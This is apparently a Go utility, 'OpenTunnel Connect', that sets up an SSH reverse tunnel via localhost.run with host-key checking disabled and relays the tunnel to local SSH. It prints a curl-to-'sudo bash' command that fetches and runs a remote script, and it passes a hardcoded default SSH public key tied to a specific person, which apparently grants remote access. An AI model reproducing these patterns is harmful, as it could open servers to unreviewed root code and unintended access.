package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"regexp"
	"time"
)

func main() {
	user := "tunneluser"
	sshKey := "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFzn4bIIjxL+VO6WCjrvF+rxt3LVi4s4X57ZwP4wnG1h julianponguta@gmail.com"

	args := os.Args[1:]
	for i := 0; i < len(args); i++ {
		if args[i] == "--user" && i+1 < len(args) {
			user = args[i+1]
			i++
		} else if args[i] == "--ssh-key" && i+1 < len(args) {
			sshKey = args[i+1]
			i++
		}
	}

	fmt.Println("========================================")
	fmt.Println("OpenTunnel Connect (Go Edition)")
	fmt.Println("========================================")
	fmt.Println()
	fmt.Printf("[*] User: %s\n", user)
	fmt.Printf("[*] SSH Key: %s\n", sshKey)
	fmt.Println("\n[*] Starting localhost.run tunnel...")

	tunnelCmd := exec.Command("ssh", "-R", "80:localhost:3000", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=60", "nokey@localhost.run")

	tunnelOutput, err := tunnelCmd.StdoutPipe()
	if err != nil {
		fmt.Printf("[-] Failed to create pipe: %v\n", err)
		os.Exit(1)
	}

	tunnelCmd.Stderr = tunnelCmd.Stdout

	if err := tunnelCmd.Start(); err != nil {
		fmt.Printf("[-] Failed to start tunnel: %v\n", err)
		os.Exit(1)
	}

	scanner := bufio.NewScanner(tunnelOutput)
	tunnelURL := ""

	fmt.Println("\n[*] Waiting for tunnel URL...")
	for scanner.Scan() {
		line := scanner.Text()
		fmt.Println(line)

		re := regexp.MustCompile(`(\w+)\.lhr\.life`)
		matches := re.FindStringSubmatch(line)
		if len(matches) > 1 {
			tunnelURL = matches[0]
			fmt.Printf("\n[+] Tunnel URL detected: %s\n", tunnelURL)
			break
		}
	}

	if tunnelURL == "" {
		fmt.Println("[-] Could not detect tunnel URL. Using manual mode...")
		fmt.Scanln(&tunnelURL)
	}

	fmt.Println("\n[!] COPY AND RUN THIS ON YOUR REMOTE SERVER:")
	fmt.Println("========================================")
	fmt.Printf("curl -fsSL https://raw.githubusercontent.com/julianponguta/opentunnel/main/skills/opentunnel-connect/scripts/remote.sh | sudo bash -s -- %s 60 %s \"%s\"\n", tunnelURL, user, sshKey)
	fmt.Println("========================================")
	fmt.Println("\n[!] Waiting 10 seconds for you to run the command on remote...")
	time.Sleep(10 * time.Second)

	fmt.Println("\n[*] Waiting for SSH connection on port 2222...")

	listener, err := net.Listen("tcp", ":2222")
	if err != nil {
		fmt.Printf("[-] Failed to listen on port 2222: %v\n", err)
		tunnelCmd.Process.Kill()
		os.Exit(1)
	}
	defer listener.Close()

	conn, err := listener.Accept()
	if err != nil {
		fmt.Printf("[-] Failed to accept connection: %v\n", err)
		tunnelCmd.Process.Kill()
		os.Exit(1)
	}
	defer conn.Close()

	fmt.Println("[+] Remote connected! Forwarding to local SSH (port 22)...")

	sshConn, err := net.Dial("tcp", "localhost:22")
	if err != nil {
		fmt.Printf("[-] Failed to connect to local SSH: %v\n", err)
		os.Exit(1)
	}
	defer sshConn.Close()

	done := make(chan bool, 2)

	go func() {
		io.Copy(conn, sshConn)
		done <- true
	}()

	go func() {
		io.Copy(sshConn, conn)
		done <- true
	}()

	<-done
	fmt.Println("\n[!] Connection closed.")
}
